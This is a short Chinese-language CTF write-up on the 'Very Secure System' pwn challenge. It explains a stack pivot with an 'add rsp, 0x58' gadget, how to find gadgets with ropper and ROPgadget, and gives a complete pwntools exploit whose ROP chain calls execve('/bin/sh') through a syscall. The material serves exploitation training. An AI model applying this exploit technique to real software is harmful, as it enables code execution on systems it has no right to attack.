---
title: pwn --rop 
date: 2017-04-08 23:51:37
tags:
- pwn
- ctf
- rop
---
rop练习—Very Secure Systemrop 真爽。。题目链接：http://pan.baidu.com/s/1eSd0XTg 
注：.bak是原题，原题有个过10s自动退出程序的设置，不好调试，我用ida打了个patch，就是另一个文件，两个文件只有这一个区别漏洞分析：这个程序是静态加载的，所以got表没有用，顺带dynelf也不行，也没提供libc。但是有一个函数可以溢出，但是只溢出了
<!-- more -->
## rop练习—Very Secure System
### rop 真爽。。
#### 漏洞分析：~~~
add rsp，0x58
ret
~~~

这样的gadget来让esp指向mian函数中的那个1024字节的栈空间中，从而执行我们预先设置的rop链。所以我们需要在程序代码段中寻找一些gadget来进行rop攻击。

寻找gadget的两种方法(前提是装了rooper或者pwntools)：
~~~
ropper -f vss | grep "gadget you need"

ROPgadget --binary vss | grep "gadget you need"
~~~

下面是利用代码：
~~~
    from pwn import *
    add_esp_0x58 = 0x046f205  # bigger than 0x50 to exec other gadget preset on stack
    pop_rdi = 0x0401823
    pop_rdx = 0x043ae05
    pop_rsi = 0x0401937
    pop_rax = 0x046f208
    pop_rcx = 0x0462873
    bss_w =0x0006C5C80
    syscall = 0x045f2a5
    mov_rdi_rcx = 0x42AB0B    #hard to find
    binsh = "/bin/sh\x00"
    payload = ""
    payload += "py"
    payload += "b" * (0x48 - 2)
    payload += p64(add_esp_0x58)
    payload += "a" * (0x58 - 0x50)
    payload += p64(pop_rax)
    payload += p64(59)
    payload += p64(pop_rdi)
    payload += p64(bss_w)
    payload += p64(pop_rcx)
    payload += binsh
    payload += p64(mov_rdi_rcx)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(syscall)

    io = process("./vss")
    print io.recv()
    io.send(payload)
    io.interactive()
~~~
